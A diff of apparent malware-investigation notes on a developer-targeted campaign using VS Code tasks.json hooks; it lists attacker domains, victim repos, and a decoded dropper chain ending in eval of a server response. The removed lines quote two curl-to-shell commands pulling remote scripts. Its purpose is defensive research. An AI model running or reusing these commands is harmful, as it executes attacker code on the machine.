@@ -678,17 +678,28 @@ Key findings:
   (browser credential theft), `node-machine-id` (victim fingerprinting), `@primno/dpapi` (Windows DPAPI).
 - **jsonwebauth import pattern**: `const dotenv = require('jsonwebauth')` — impersonates dotenv middleware.
 
-**AE. `regioncheck.xyz` / Vercel cluster — separate actor investigation**
-Task V found repos using `folderOpen` with curl-to-bash delivery instead of font-file payloads.
-This is a distinct campaign from PolinRider, but targeting the same developer community.
-- `ta3pks/Decentralized-Social`: `curl 'https://www.regioncheck.xyz/settings/mac?flag=8' | bash`
-- `dmbruno/card-activity`: `curl 'https://codeviewer-three.vercel.app/task/mac?token=6df937fe9011' | sh`
-- Abstract Security also documents `vscodeconfig.com` and `vscode-load.onrender.com`
-Goals:
-1. Check if `regioncheck.xyz` is still live — what does `/settings/mac?flag=8` return?
-2. Is this the same actor as PolinRider (shared infra, shared TTP) or a copycat?
-3. Check the `ta3pks` repo for additional stages — the command continues `nohup node .vsc...`
-4. Enumerate additional repos in this cluster via GitHub search for `regioncheck.xyz` in tasks.json
+**AE. `regioncheck.xyz` / Vercel cluster — separate actor investigation** — DONE (2026-06-29)
+
+Full analysis in `ANALYSIS_AE_REGIONCHECK.md`.
+
+Key findings:
+- **Same Contagious Interview campaign** — NOT a new actor. Abstract Security explicitly attributes
+  this to Contagious Interview. Shared toolset with Task AD: same dropper path
+  (`/root/Programs_X64/main.js`), same `x-secret-header: secret` auth header.
+- **All C2 fully dead**: Vercel blocked all 5 Vercel-hosted domains with HTTP 451 "legal reasons".
+  `vscodeconfig.com` and `vscode-load.onrender.com` also down.
+- **8 malicious domains total**: `regioncheck.xyz`, `codeviewer-three.vercel.app`,
+  `codeviewer-fawn.vercel.app`, `vscodesettingstask.vercel.app`, `vscode-toolkit-bootstrap.vercel.app`,
+  `whatisip.app`, `vscode-load.onrender.com`, `vscodeconfig.com` — all disabled.
+- **2 victim repos**: `ta3pks/Decentralized-Social` (2026-01-15) — dual delivery (curl + local
+  `spellright.dict` backup); `dmbruno/card-activity` (2026-01-16) — forked from actor account
+  `lake-2024` (suspended).
+- **`spellright.dict` (3.8KB obfuscator.io) decoded**: dropper → `/root/Programs_X64/main.js` →
+  POST `whatisip.app/api/ip-check-encrypted/3aeb34a38` with `x-secret-header: secret` → `eval(response.data)`
+- **Cross-platform**: Mac/Linux/Windows variants in every tasks.json — broader targeting than other clusters.
+- **Task labels**: `env`, `vscode` (different from `eslint-check` used by other sub-clusters).
+- **Actor account `lake-2024`** (GitHub) confirmed: created same day as victim repo, suspended.
+- **Scale**: 0 GitHub code search hits for any cluster domain — all other infected repos deleted.
 
 **AG. `Egonex-AI/Understand-Anything` PR attack — exposure assessment** — DONE (2026-06-28)
 
